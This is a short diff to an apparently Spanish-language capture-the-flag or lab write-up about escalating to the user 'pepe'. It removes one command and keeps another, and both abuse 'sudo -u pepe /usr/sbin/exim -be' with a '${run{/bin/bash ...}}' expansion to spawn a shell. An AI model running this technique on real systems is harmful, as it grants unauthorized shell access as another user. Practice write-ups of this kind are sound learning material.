@@ -262,8 +262,6 @@ aunque fuera sido tan facil como consultarle a la inteligencia artificial y auto
 pero existe un problema al intentar lanzar una bash como el user pepe
 
 ```
-maci@9c13e159e6ea:~$ sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "bash -p"}}'
-
 maci@9c13e159e6ea:~$ sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "/bin/bash"}}'
 ```
 
